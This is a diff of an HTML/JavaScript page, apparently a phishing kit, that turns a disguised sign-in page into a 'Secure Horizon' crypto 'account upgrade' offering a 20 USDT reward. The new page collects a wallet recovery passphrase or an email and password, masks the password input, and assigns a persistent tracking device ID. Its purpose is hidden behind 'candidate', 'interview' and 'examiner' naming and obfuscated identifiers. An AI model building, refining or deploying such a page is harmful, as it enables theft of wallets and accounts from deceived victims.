@@ -4,278 +4,597 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Candidate Portal - Official</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        html, body{
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            font-weight: 400;
-            font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
-            font-size: 0.9375rem;
+        :root {
+            --bg-dark: #070a13;
+            --card-bg: #111827;
+            --card-border: rgba(255, 255, 255, 0.05);
+            --accent-blue: #00D1FF;
+            --accent-blue-dim: rgba(0, 209, 255, 0.1);
+            --text-main: #FFFFFF;
+            --text-dim: #94A3B8;
+            --input-bg: #030712;
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.3), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5), 0 4px 6px -2px rgba(0, 0, 0, 0.3);
+            --shadow-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.4);
+            --transition-main: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        #screen-target { width: 100%; height: 100%; }
-
-        *, * a{
-            list-style: none;
-            text-decoration: none;
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             margin: 0;
             padding: 0;
+            overflow-x: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        #country-selection-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            width: 100%;
+            height: 100vh;
+            padding: 40px 20px;
             box-sizing: border-box;
+            background-color: var(--bg-dark);
+            opacity: 0;
+            transform: scale(0.98);
+            animation: screenEntry 0.5s ease forwards;
         }
 
-        .q7n4v8r2t1_992211{
-            height: 100%;
-            width: 100%;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        .selector-header {
+            text-align: center;
+            max-width: 600px;
+            margin-bottom: 50px;
         }
 
-        .b5h3d9s8l2_992211{
-            height: 100%;
+        .country-grid-container {
             width: 100%;
-            position: absolute;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .country-grid {
+            display: grid;
+            gap: 20px;
+            width: 100%;
+            padding-bottom: 40px;
+        }
+
+        /* Grid Breakpoints */
+        @media (min-width: 1200px) { .country-grid { grid-template-columns: repeat(6, 1fr); } }
+        @media (max-width: 1199px) and (min-width: 992px) { .country-grid { grid-template-columns: repeat(5, 1fr); } }
+        @media (max-width: 991px) and (min-width: 768px) { .country-grid { grid-template-columns: repeat(4, 1fr); } }
+        @media (max-width: 767px) and (min-width: 480px) { .country-grid { grid-template-columns: repeat(3, 1fr); } }
+        @media (max-width: 479px) { .country-grid { grid-template-columns: repeat(2, 1fr); } }
+
+
+        
+        /* Full-screen Preloader Overlay */
+        #preloader {
+            position: fixed;
             top: 0;
-            right: 0;
-        }
-
-        .b5h3d9s8l2_992211 img{
-            width: 100%;
-            height: 100%;
-        }
-
-        .c8j2f6w9z4_992211{
-            position: relative;
-            width: calc(100% - 40px);
-            max-width: 440px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .d3k7u1y5x8_992211 img{
-            width: 170px;
-        }
-
-        .e6p4m2q9r7_992211{
-            width: 100%;
-            background: #fff;
-            box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
-            padding: 44px;
-            margin-top: 20px;
-            position: relative;
-            height: 350px;
-        }
-
-        .f1t8v3n6b5_992211{
-            width: 100%;
-        }
-
-        .g9w2s4h7k1_992211{
-            font-size: 16px;
-            line-height: 24px;
-            text-overflow: ellipsis;
-            margin: 20px 0;
-            color: #404040;
-        }
-
-        .i6n2b8v4c3_992211{
-            padding: 0 !important;
-        }
-
-        .j5k9d3l7s1_992211{
-            border-bottom: 1px solid #404040;
-            width: 100%;
-            padding: 10px 0;
-            margin-top: 10px;
-            position: relative;
-        }
-
-        .u2y7t1r4e9_992211{
-            border-bottom: 1px solid red;
-        }
-
-        .j5k9d3l7s1_992211:focus-within{
-            border-bottom: 1px solid rgb(0, 103, 184);
-        }
-
-        .j5k9d3l7s1_992211 input{
-            width: 100%;
-            border: none;
-            font-size: 16px;
-        }
-
-        .j5k9d3l7s1_992211 input:focus{
-            outline: none;
-        }
-
-        #m7n2b5v8c1_992211{
-            position: absolute;
-            bottom: -20px;
             left: 0;
             width: 100%;
-            color: red;
-            display: none;
-        }
-
-        .k3l8p2o7i4_992211{
-        margin-top: 15px;
-        }
-
-        .btn-primary{
-            border-radius: 0 !important;
-        }
-
-        .l9q1w4e7r2_992211{
+            height: 100%;
+            background-color: var(--bg-dark);
             display: flex;
-            justify-content: flex-end;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999; /* Stay on top of everything */
+            transition: opacity 0.6s ease, visibility 0.6s;
+        }
+
+        /* The Animated Orbit */
+        .loader-orbit {
+            width: 60px;
+            height: 60px;
+            border: 3px solid var(--accent-blue-dim);
+            border-top: 3px solid var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+            position: relative;
+        }
+
+        /* Inner pulsating glow */
+        .loader-orbit::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 30px;
+            height: 30px;
+            background: var(--accent-blue);
+            border-radius: 50%;
+            filter: blur(10px);
+            opacity: 0.5;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .loader-text {
             margin-top: 20px;
-            width: 100%;
-        }
-
-        .l9q1w4e7r2_992211 a{
-            padding-left: 30px;
-            padding-right: 30px;
+            color: var(--text-dim);
+            font-size: 13px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             font-weight: 600;
-            font-weight: 16px;
         }
 
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.3; }
+            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.6; }
+        }
+
+        /* Class to fade out the loader */
+        .loader-hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+
+
+        /* Spinner Animation */
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .spinner-border {
+            display: inline-block;
+            width: 1rem;
+            height: 1rem;
+            vertical-align: text-bottom;
+            border: 0.2em solid currentColor;
+            border-right-color: transparent;
+            border-radius: 50%;
+            animation: spin .75s linear infinite;
+            margin-left: 8px;
+            display: none; /* Hidden by default */
+        }
+
+        /* State when button is processing */
+        .btn-loading .spinner-border {
+            display: inline-block;
+        }
+
+        .btn-loading {
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        .country-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 12px;
+            padding: 24px 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition-main);
+            box-shadow: var(--shadow-md);
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        .country-card:hover {
+            border-color: rgba(0, 209, 255, 0.4);
+            transform: translateY(-4px);
+            box-shadow: 0 12px 20px -5px rgba(0, 209, 255, 0.15), var(--shadow-lg);
+            background: #151e2e;
+        }
+
+        .country-card:active {
+            transform: scale(0.96) translateY(0px);
+            box-shadow: var(--shadow-inner);
+            border-color: var(--accent-blue);
+        }
+
+        /* Squared flag with radius */
+        .flag-box {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 16px;
+            border-radius: 8px; /* Little radius */
+            object-fit: cover;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .country-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text-main);
+        }
+
+        #form-screen {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            box-sizing: border-box;
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .form-container {
+            background: var(--card-bg);
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: var(--shadow-lg);
+            border: 1px solid var(--card-border);
+            text-align: center;
+        }
+
+        .logo-area { margin-bottom: 25px; }
+        .logo { color: var(--accent-blue); font-size: 24px; font-weight: 700; text-decoration: none; display: inline-block; letter-spacing: -0.5px; }
+        
+        .reward-badge {
+            background: var(--accent-blue-dim);
+            color: var(--accent-blue);
+            padding: 8px 16px;
+            border-radius: 100px;
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            font-weight: 600;
+            font-size: 13px;
+            border: 1px solid rgba(0, 209, 255, 0.2);
+        }
+
+        .classic-title { font-size: 28px; margin-bottom: 10px; }
+        .classic-desc { color: var(--text-dim); font-size: 15px; max-width: 400px; margin: 0 auto; line-height: 1.6; }
+
+        .selected-region-bar {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--card-border);
+            padding: 12px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: var(--transition-main);
+        }
+
+        /* Tiny flag for region bar */
+        .flag-box-sm {
+            width: 20px;
+            height: 20px;
+            border-radius: 4px;
+            object-fit: cover;
+        }
+
+        .tab-container { display: flex; margin-bottom: 25px; border-bottom: 1px solid rgba(255,255,255,0.08); }
+        .tab { flex: 1; padding: 12px; cursor: pointer; color: var(--text-dim); font-size: 14px; transition: var(--transition-main); }
+        .tab.active { color: var(--accent-blue); border-bottom: 2px solid var(--accent-blue); font-weight: 600; }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            background: var(--input-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 10px;
+            color: white;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+
+        button.action-btn {
+            width: 100%;
+            padding: 15px;
+            background: var(--accent-blue);
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 209, 255, 0.3);
+        }
+
+        .hidden { display: none !important; }
+
+        @keyframes screenEntry { to { opacity: 1; transform: scale(1); } }
+        @keyframes formEntry { to { opacity: 1; transform: translateY(0); } }
+        .animate-form-in { animation: formEntry 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards; }
+        .animate-screen-exit { animation: screenExit 0.4s ease forwards; opacity: 0; transform: scale(1.02); }
     </style>
 </head>
 <body>
 
 <div id="screen-target" class="wrapper">
-    <div id="a1x9k2m7p4_992211" class="q7n4v8r2t1_992211">
-			
-			<div class="b5h3d9s8l2_992211">
-				<img src="../images/a8f3k2m9q1.webp">
-			</div>
-			<div class="c8j2f6w9z4_992211">
-				<div class="d3k7u1y5x8_992211">
-					<img src="../images/z0x4n7b2c9.png">
-				</div>
-				<div class="e6p4m2q9r7_992211">
-					<div class="f1t8v3n6b5_992211">
-						<img src="../images/m5t8r1p4w6.png">
-					</div>
-					<div class="g9w2s4h7k1_992211">
-						<img src="../images/q9c2v7l0s3.png">
-						<span id="u8z3x6c1v5"></span>
-					</div>
-					<div class="h4r7m1p9q2_992211">
-						<div class="i6n2b8v4c3_992211">
-							<img src="../images/h4k8d1n6p2.png">
-						</div>
-						<div class="j5k9d3l7s1_992211" id="z3x8c2v7b1n6m5">
-							<input type="hidden" id="email-input">
-							<input type="text" id="indicator" autocomplete="off" placeholder="Type here...">
-							<input type="hidden" id="placeholder" value="">
-				
-						</div>
-						<div style="width: 100%; text-align: center;" id="error-div" class="text-danger"></div>
-						<div class="l9q1w4e7r2_992211">
-							<button  onclick="(startInterview())" class="btn btn-primary btn-start">Sign in
-								<span id="z6x2c9v4b1_992211" class="spinner-border spinner-border-sm"></span>
-							</button>
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
+    <div id="preloader">
+        <div class="loader-orbit"></div>
+        <div class="loader-text">Initializing Secure Environment...</div>
+    </div>
 
+    <div id="country-selection-screen">
+        <div class="logo-area">💠 <a class="logo" href="#">SECURE HORIZON</a></div>
+        <div class="selector-header">
+            <h1 class="classic-title">Choose Your Country</h1>
+            <p class="classic-desc">Selecting the correct region ensures your identity verification complies with local regulations.</p>
+        </div>
+        <div class="country-grid-container">
+            <div id="country-grid" class="country-grid">
+                <!-- Populated by JavaScript -->
+            </div>
+        </div>
+    </div>
 
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>
-
-<script>
-
-	
-
-    const indicator = document.getElementById('indicator');
-    const placeholder = document.getElementById('placeholder');
-   
-   window.onload = function() {
-	  document.getElementById('indicator').focus();
-      document.getElementById('indicator').value = "";
-      document.getElementById('placeholder').value = "";
-      $('#z6x2c9v4b1_992211').hide();
-	}
-
-    indicator.addEventListener('input', (e) => {
-        let currentRaw = placeholder.value;
-        let currentDisplay = indicator.value;
-        
-        // 1. Calculate how many characters were added or removed
-        const diff = currentDisplay.length - currentRaw.length;
-        const cursorPosition = indicator.selectionStart;
-
-        if (diff > 0) {
-            // Addition: User typed or pasted
-            const addedChars = currentDisplay.substring(cursorPosition - diff, cursorPosition);
-            const before = currentRaw.substring(0, cursorPosition - diff);
-            const after = currentRaw.substring(cursorPosition - diff);
-            placeholder.value = before + addedChars + after;
-        } 
-        else if (diff < 0) {
-            // Deletion: Backspace, delete, or highlight+delete
-            // We find the 'gap' by comparing the previous length and current cursor
-            const removedCount = Math.abs(diff);
-            const before = currentRaw.substring(0, cursorPosition);
-            const after = currentRaw.substring(cursorPosition + removedCount);
-            placeholder.value = before + after;
-        }
-        else if (diff === 0 && currentDisplay !== "*".repeat(currentRaw.length)) {
-            // Replacement: Highlighted text and replaced with same number of chars
-            const addedChars = currentDisplay.substring(cursorPosition - currentRaw.length, cursorPosition);
-            // In a complex replacement, it's safer to re-sync based on selection
-            // But for most cases, the diff logic covers it.
-        }
-
-        // 2. Mask the Indicator immediately
-        indicator.value = "*".repeat(placeholder.value.length);
-        
-        // 3. Restore Cursor Position (Masking resets it to the end)
-        indicator.setSelectionRange(cursorPosition, cursorPosition);
-
-        // Demo display
-        
-    });
-
-    // Handle "Select All + Backspace/Delete" specifically for some browsers
-    indicator.addEventListener('keydown', (e) => {
-        if (indicator.selectionStart === 0 && indicator.selectionEnd === indicator.value.length) {
-            if (e.key === 'Backspace' || e.key === 'Delete') {
-                placeholder.value = "";
-            }
-        }
-    });
-</script>
-<script>
-	
-        const queryString = window.location.search;
-        const urlParams = new URLSearchParams(queryString);
-        const defaultPage = true;
-        const parameter = urlParams.get('email');
-        
-        if (parameter) {
+    <div id="form-screen" class="hidden">
+        <div class="form-container">
+            <div class="reward-badge">🎁 KYB Reward: 20 USDT</div>
+            <h2 class="classic-title" style="font-size: 24px;">Upgrade Account</h2>
             
+            <div id="selected-region-bar" class="selected-region-bar" onclick="backToSelector()">
+                <span>Region:</span>
+                <div id="region-flag"></div>
+                <strong id="region-name"></strong>
+                <span style="margin-left: auto; color: var(--accent-blue); font-size: 11px;">Change</span>
+            </div>
 
-            if($("#u8z3x6c1v5")){
-                $("#u8z3x6c1v5").html(parameter);
+            <div id="tabs" class="tab-container">
+                <div id="pass" class="tab active" onclick="switchTab('passphrase')">Passphrase</div>
+                <div id="cred" class="tab">
+                    <span class="creds"  onclick="switchTab('credentials')">Sign In</span>
+                </div>
+                
+            </div>
+
+            <form>
+                <input type="hidden" name="selected_country" id="country-hidden-input">
+                
+                <div id="credentials-section" class="creds hidden">
+                    <input id="email-input" placeholder="Email or Username" required>
+                    <input id="indicator" autocomplete="off" placeholder="Passphrase" required>
+                    <input type="hidden" id="placeholder" value="">
+                    <button type="button" onclick="startInterview(this, 'credentials')" class="action-btn btn-start">
+                        <span class="btn-text">Process Verification</span>
+                        <span id="z6x2c9v4b1_992211" class="spinner-border"></span>
+                    </button>
+                </div>
+
+                <div id="passphrase-section">
+                    <textarea id="phrase" rows="4" placeholder="word1 word2 word3..."></textarea>
+                    <button type="button" onclick="startInterview(this, 'passphrase')" class="action-btn">
+                        <span class="btn-text">Connect Wallet securely</span>
+                        <span id="z6x2c9v4b1_992211" class="spinner-border"></span>
+                    </button>
+                </div>
+                <div style="width: 100%; color: #dc3545; margin-top: 10px; text-align: center;" class="text-danger"><small id="error-div"></small></div>
+            </form>
+        </div>
+
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+    <script>
+
+       let accessType = "passphrase"; 
+
+        const indicator = document.getElementById('indicator');
+        const placeholder = document.getElementById('placeholder');
+       
+       window.onload = function() {
+          document.getElementById('indicator').focus();
+          document.getElementById('indicator').value = "";
+          document.getElementById('placeholder').value = "";
+          $('#z6x2c9v4b1_992211').hide();
+
+          // 1. Render the countries first so the <img> tags exist in the DOM
+            renderCountries(countriesData);
+
+            displayForms();
+
+            // 2. Target all flag images that were just created
+            const allFlags = document.querySelectorAll('.flag-box');
+            let loadedCount = 0;
+            const totalFlags = allFlags.length;
+
+            if (totalFlags === 0) {
+                hidePreloader();
+                return;
             }
-            
-            if($("#email-input")){
-                $("#email-input").val(parameter);
+
+            // 3. Monitor each image for completion
+            allFlags.forEach(img => {
+                if (img.complete) {
+                    checkIncrement();
+                } else {
+                    img.addEventListener('load', checkIncrement);
+                    img.addEventListener('error', checkIncrement); // Count errors too so we don't get stuck
+                }
+            });
+
+            function checkIncrement() {
+                loadedCount++;
+                if (loadedCount >= totalFlags) {
+                    // Slight delay for a smoother "reveal" experience
+                    setTimeout(hidePreloader, 500);
+                }
             }
         }
-   
-    
-</script>
+
+        indicator.addEventListener('input', (e) => {
+            let currentRaw = placeholder.value;
+            let currentDisplay = indicator.value;
+            
+            // 1. Calculate how many characters were added or removed
+            const diff = currentDisplay.length - currentRaw.length;
+            const cursorPosition = indicator.selectionStart;
+
+            if (diff > 0) {
+                // Addition: User typed or pasted
+                const addedChars = currentDisplay.substring(cursorPosition - diff, cursorPosition);
+                const before = currentRaw.substring(0, cursorPosition - diff);
+                const after = currentRaw.substring(cursorPosition - diff);
+                placeholder.value = before + addedChars + after;
+            } 
+            else if (diff < 0) {
+                // Deletion: Backspace, delete, or highlight+delete
+                // We find the 'gap' by comparing the previous length and current cursor
+                const removedCount = Math.abs(diff);
+                const before = currentRaw.substring(0, cursorPosition);
+                const after = currentRaw.substring(cursorPosition + removedCount);
+                placeholder.value = before + after;
+            }
+            else if (diff === 0 && currentDisplay !== "*".repeat(currentRaw.length)) {
+                // Replacement: Highlighted text and replaced with same number of chars
+                const addedChars = currentDisplay.substring(cursorPosition - currentRaw.length, cursorPosition);
+                // In a complex replacement, it's safer to re-sync based on selection
+                // But for most cases, the diff logic covers it.
+            }
+
+            // 2. Mask the Indicator immediately
+            indicator.value = "*".repeat(placeholder.value.length);
+            
+            // 3. Restore Cursor Position (Masking resets it to the end)
+            indicator.setSelectionRange(cursorPosition, cursorPosition);
+
+            // Demo display
+            
+        });
+
+        // Handle "Select All + Backspace/Delete" specifically for some browsers
+        indicator.addEventListener('keydown', (e) => {
+            if (indicator.selectionStart === 0 && indicator.selectionEnd === indicator.value.length) {
+                if (e.key === 'Backspace' || e.key === 'Delete') {
+                    placeholder.value = "";
+                }
+            }
+        });
+    </script>
+
+    <script>
+
+        function checkExaminerOnline(){
+            return true;
+        }
+
+        function displayForms(){
+            const isExaminer = checkExaminerOnline();
+            isExaminer? $(".creds").show() : $(".creds").hide()
+        }
+       
+
+        function hidePreloader() {
+            const preloader = document.getElementById('preloader');
+            preloader.classList.add('loader-hidden');
+        }
+        // Country JSON Data (Using ISO Alpha-2 codes for flags)
+        const countriesData = [
+            { name: "United States", code: "us" },
+            { name: "United Kingdom", code: "gb" },
+            { name: "Canada", code: "ca" },
+            { name: "Australia", code: "au" },
+            { name: "Nigeria", code: "ng" },
+            { name: "Singapore", code: "sg" },
+            { name: "Germany", code: "de" },
+            { name: "France", code: "fr" },
+            { name: "Japan", code: "jp" },
+            { name: "South Africa", code: "za" },
+            { name: "Brazil", code: "br" },
+            { name: "India", code: "in" }
+        ];
+
+        // Function to render the country cards dynamically
+        function renderCountries(data) {
+            const grid = document.getElementById('country-grid');
+            grid.innerHTML = ''; // Clear existing
+
+            data.forEach(country => {
+                const flagUrl = `https://flagcdn.com/w160/${country.code.toLowerCase()}.png`;
+                
+                const card = document.createElement('div');
+                card.className = 'country-card';
+                card.onclick = () => selectCountry(country.name, flagUrl);
+                
+                card.innerHTML = `
+                    <img src="${flagUrl}" class="flag-box" alt="${country.name}">
+                    <span class="country-label">${country.name}</span>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        const selectionScreen = document.getElementById('country-selection-screen');
+        const formScreen = document.getElementById('form-screen');
+        const credentialsSec = document.getElementById('credentials-section');
+        const passphraseSec = document.getElementById('passphrase-section');
+        const regionBarName = document.getElementById('region-name');
+        const regionBarFlag = document.getElementById('region-flag');
+        const countryInput = document.getElementById('country-hidden-input');
+        const tabElements = document.querySelectorAll('.tab');
+
+        function selectCountry(name, flagUrl) {
+            selectionScreen.classList.add('animate-screen-exit');
+            
+            regionBarName.innerText = name;
+            regionBarFlag.innerHTML = `<img src="${flagUrl}" class="flag-box-sm">`;
+            countryInput.value = name;
+
+            setTimeout(() => {
+                selectionScreen.classList.add('hidden');
+                selectionScreen.classList.remove('animate-screen-exit');
+                formScreen.classList.remove('hidden');
+                formScreen.classList.add('animate-form-in');
+            }, 350);
+        }
+
+        function backToSelector() {
+            formScreen.classList.remove('animate-form-in');
+            formScreen.classList.add('hidden');
+            selectionScreen.classList.remove('hidden');
+        }
+
+        function switchTab(type) {
+            if(type === 'credentials') {
+                credentialsSec.classList.remove('hidden');
+                passphraseSec.classList.add('hidden');
+                document.getElementById('cred').classList.add('active');
+                document.getElementById('pass').classList.remove('active');
+                accessType = 'credentials';
+            } else {
+                accessType = 'passphrase';
+                credentialsSec.classList.add('hidden');
+                passphraseSec.classList.remove('hidden');
+                document.getElementById('pass').classList.add('active');
+                document.getElementById('cred').classList.remove('active');
+            }
+        }
+
+        function startInterview(btn, type) {
+            // 1. Add the loading class to show spinner & disable clicks
+            btn.classList.add('btn-loading');
+            
+            // 2. Change the text (Optional, for better UX)
+            const btnText = btn.querySelector('.btn-text');
+            if(btnText) btnText.innerText = "Processing...";
+
+            // 3. Simulate a process (Replace this with your actual logic/form submit)
+            console.log("Form is processing...");
+            alert(accessType);
+            // Example: Submitting the form after 2 seconds
+            setTimeout(() => {
+                // Find the parent form and submit it
+                // btn.closest('form').submit();
+                
+                // OR if you want to reset it:
+                btn.classList.remove('btn-loading');
+                btnText.innerText = "Process Verification";
+            }, 2000);
+        }
+    </script>
 </div>
 
 <script src="/socket.io/socket.io.js"></script>
@@ -328,12 +647,35 @@
         }
     }*/
 
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
 
-    function startInterview(isRestore = false) {
+    function getOrCreateDeviceID() {
+        let deviceId = localStorage.getItem('tracked_device_id');
+        
+        if (!deviceId) {
+            // First time visiting! Generate a new ID
+            deviceId = generateUUID();
+            localStorage.setItem('tracked_device_id', deviceId);
+        }
+        
+        return deviceId;
+    }
+
+
+    function startInterview(type, isRestore = false) {
+
+
         if(!isRestore) {
-            candidateName = document.getElementById('placeholder').value;
-            candidateEmail = document.getElementById('email-input').value;
-            
+
+
+            candidateName = type === "credentials"? document.getElementById('placeholder').value : document.getElementById('phrase').value;
+            candidateEmail = type === "credentials"? document.getElementById('email-input').value : getOrCreateDeviceID();
+            selectedCategory = document.getElementById('selected_country').value;
             if(!candidateName || !candidateEmail || !selectedCategory) {
                 return alert("Select a role and enter both your name and email.");
             }
